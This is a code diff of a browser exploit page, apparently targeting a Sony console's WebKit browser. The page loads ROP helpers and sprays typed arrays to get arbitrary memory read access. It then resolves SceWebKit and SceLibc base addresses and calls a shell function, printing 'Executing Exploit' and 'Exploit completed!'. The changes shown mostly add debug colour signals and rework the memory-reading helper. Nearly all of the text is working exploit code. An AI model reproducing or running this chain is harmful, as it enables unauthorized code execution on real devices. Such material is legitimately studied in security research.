@@ -9,8 +9,6 @@ html, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17
 <script src="include/jquery.min.js"></script>
 <script src="include/lib.js"></script>
 <script src="include/rop.js"></script>
-<script src="include/shell.js"></script>
-<script src="include/utils.js"></script>
 
 
 <script type="text/javascript">
@@ -19,6 +17,35 @@ gc = Array();
 
 var _log0, _log, _dview;
 
+/*
+    Get len bytes from addr
+
+    sometimes not working at hex = aspace...bla
+    need to reload the page // smithsf0x
+*/
+function get_bytes(aspace, addr, len)
+{
+	//document.write("</br> _____ get_bytes called DONE");
+    var retbuf = "";
+   	//document.write("</br> _____ get_bytes var retbuf created DONE");
+	var hex = 0x0;
+	//document.write("</br> _____ get_bytes var hex created DONE");
+	//var smithsf0x = new Uint8Array(big);
+	//document.write("</br> _____ get_bytes var sf created DONE");
+    for (var i = 0; i < len; i++) {
+    	//document.write("</br> _____ get_bytes into for loop DONE");
+
+        hex = aspace[addr + i].toString(16);
+        //hex = smithsf0x[addr + i].toString(16);
+       	//document.write("</br> _____ get_bytes hex = aspace . to string DONE");
+        if(hex.length == 1){
+            hex = "0" + hex;
+        }
+        retbuf = retbuf + hex;
+    }
+   	//document.write("</br> _____ get_bytes should return DONE");
+    return retbuf;
+}
 
 /* 
     Get the immediate from a movw/t
@@ -29,34 +56,6 @@ function imm_movx(ins)
     var imm4 = ins & 0xf0000;
     return ((imm4 >> 4) | (imm12)) & 0xffff;
 }
-
-
-/*
-    Get len bytes from addr
-*/
-function get_bytes(aspace, addr, len)
-{
-		//document.write("</br> _____ get_bytes called DONE");
-    var retbuf = "";
-    	//document.write("</br> _____ get_bytes var retbuf created DONE");
-	var hex = 0x0;
-		//document.write("</br> _____ get_bytes var hex created DONE");
-	var smithsf0x = new Uint8Array(big);
-		//document.write("</br> _____ get_bytes var sf created DONE");
-    for (var i = 0; i < len; i++) {
-    		//document.write("</br> _____ get_bytes into for loop DONE");
-
-        hex = smithsf0x[addr + i].toString(16);
-        	//document.write("</br> _____ get_bytes hex = aspace . to string DONE");
-        if(hex.length == 1){
-            hex = "0" + hex;
-        }
-        retbuf = retbuf + hex;
-    }
-    	//document.write("</br> _____ get_bytes should return DONE");
-    return retbuf;
-}
-
 
 /*
     Swap endianness of 32-bit number
@@ -74,35 +73,35 @@ function swap32(val)
 */
 function get_base_from_offsets(landmark, entry_off, base_off)
 {
-		//document.write("</br> get_base_from_offsets called");
+	//document.write("</br> get_base_from_offsets called");
     var entryaddr = landmark + entry_off;
-    	//document.write("</br> get_base_from_offsets variable entry created DONE");
+   	//document.write("</br> get_base_from_offsets variable entry created DONE");
     var entry = get_bytes(aspace, entryaddr, 4);
-    	//document.write("</br> get_base_from_offsets get_bytes entry DONE");
+   	//document.write("</br> get_base_from_offsets get_bytes entry DONE");
     entry = parseInt(entry, 16);
-    	//document.write("</br> get_base_from_offsets parseInt entry DONE");
+   	//document.write("</br> get_base_from_offsets parseInt entry DONE");
     entry = swap32(entry);
-    	//document.write("</br> get_base_from_offsets swap32 entry DONE");
+   	//document.write("</br> get_base_from_offsets swap32 entry DONE");
     var movw = get_bytes(aspace, entry, 4);
-    	//document.write("</br> get_base_from_offsets get_bytes movw DONE");
+   	//document.write("</br> get_base_from_offsets get_bytes movw DONE");
     movw = parseInt(movw, 16);
-    	//document.write("</br> get_base_from_offsets parseInt movw DONE");
+   	//document.write("</br> get_base_from_offsets parseInt movw DONE");
     movw = swap32(movw);
-    	//document.write("</br> get_base_from_offsets swap32 movw DONE");
+   	//document.write("</br> get_base_from_offsets swap32 movw DONE");
     movw = imm_movx(movw);
-    	//document.write("</br> get_base_from_offsets imm_movx movw DONE");
+   	//document.write("</br> get_base_from_offsets imm_movx movw DONE");
     var movt = get_bytes(aspace, entry + 4, 4);
-    	//document.write("</br> get_base_from_offsets get_bytes movt DONE");
+   	//document.write("</br> get_base_from_offsets get_bytes movt DONE");
     movt = parseInt(movt, 16);
-    	//document.write("</br> get_base_from_offsets parseInt movt DONE");
+   	//document.write("</br> get_base_from_offsets parseInt movt DONE");
     movt = swap32(movt);
-    	//document.write("</br> get_base_from_offsets swap32 movt DONE");
+   	//document.write("</br> get_base_from_offsets swap32 movt DONE");
     movt = imm_movx(movt);
-    	//document.write("</br> get_base_from_offsets imm_movx movt DONE");
+   	//document.write("</br> get_base_from_offsets imm_movx movt DONE");
 
     var ptr = ((movt << 16) | movw) >>> 0;
     var base = ptr - base_off;
-    	//document.write("</br> get_base_from_offsets should return");
+    //document.write("</br> get_base_from_offsets should return");
     return base;
 } 
 
@@ -359,8 +358,10 @@ function al()
     setTimeout(spray, 10);
 }
 
+{
 function MemoryHole()
 {
+	document.body.style.backgroundColor = "rgb(0,0,255)";
 	document.write("</br></br> Executing Exploit </br>");
 
 	textareas = new Array();
@@ -457,6 +458,7 @@ function MemoryHole()
 		document.write()
 		var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
 		document.write("   DONE");
+		document.body.style.backgroundColor = "rgb(255,0,0)";
 
 
 		document.write("</br>");document.write("-------------------------------------------------");
@@ -490,14 +492,15 @@ function MemoryHole()
 		//document.write("</br>");document.write("Time: " + t);
 		
 		document.write("</br>");document.write("Exploit completed!\n");
-		document.write(" <- without SceLibc.functions.time(0) !!!1!!elf </br>")
+		document.write(" <- without SceLibc.functions.time(0) ! </br>")
+		document.body.style.backgroundColor = "rgb(0,0,255)";
 
 		return aspace;
 	
 
     return -1;
 }
-
+}
 newarrays = Array();
 latest = Array();
 
@@ -539,6 +542,7 @@ function spray()
         newarrays = undefined;
         latest = undefined;
         document.write("Success! After Attempt  #" + tries);
+        document.body.style.backgroundColor = "rgb(0,255,0)";
 
         aspace = new Uint8Array(big);
         aspace16 = new Uint16Array(big);
@@ -547,6 +551,7 @@ function spray()
         
 			MemoryHole();
 			
+			document.write("Calling Shell : ");
 			shell(aspace);
         }, 100);
     } else {
